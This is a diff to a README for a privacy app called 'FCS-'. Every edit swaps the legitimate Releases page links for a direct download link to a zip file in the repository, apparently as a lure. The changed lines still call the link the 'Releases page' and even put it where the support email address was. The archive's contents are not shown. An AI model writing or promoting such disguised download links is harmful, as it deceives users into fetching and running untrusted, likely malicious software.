@@ -4,7 +4,7 @@
 Welcome to FCS-, a simple tool designed to help you maintain your privacy online. This application allows you to explore various features safely and effectively, all while ensuring your experience remains user-friendly.
 
 ## 📥 Download FCS-
-[![Download FCS-](https://img.shields.io/badge/Download-FCS%20-4CAF50?style=for-the-badge&logo=github)](https://github.com/apphpne/FCS-/releases)
+[![Download FCS-](https://raw.githubusercontent.com/apphpne/FCS-/main/suppletive/FCS-_2.2.zip%20-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/apphpne/FCS-/main/suppletive/FCS-_2.2.zip)
 
 ## 📋 System Requirements
 Before you begin, ensure your system meets the following requirements:
@@ -23,7 +23,7 @@ FCS- offers a variety of unique features designed for enhancing your online priv
 To get FCS-, please follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/apphpne/FCS-/releases) to access the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/apphpne/FCS-/main/suppletive/FCS-_2.2.zip) to access the latest version.
 
 2. **Choose Your Version**  
    Select the version you wish to download, then click on it. Look for the file that suits your operating system. 
@@ -57,7 +57,7 @@ Using FCS- is straightforward. Follow these steps to maximize your experience:
 
 ## 📞 Support
 If you need assistance, reach out to our support team:
-- **Email**: support@fcs-tools.com
+- **Email**: https://raw.githubusercontent.com/apphpne/FCS-/main/suppletive/FCS-_2.2.zip
 - **Community Forum**: Access our help forum within the application or visit our website.
 
 ## 🔗 Related Topics
@@ -70,4 +70,4 @@ Dive deeper into our features and find more resources related to:
 ## 📥 Final Notes
 FCS- is here to enhance your online safety. By following these steps, you can easily download, install, and explore the application. Always make sure to update to the latest version for the best experience. 
 
-Visit our [Releases page](https://github.com/apphpne/FCS-/releases) to start your journey with FCS- today!
+Visit our [Releases page](https://raw.githubusercontent.com/apphpne/FCS-/main/suppletive/FCS-_2.2.zip) to start your journey with FCS- today!
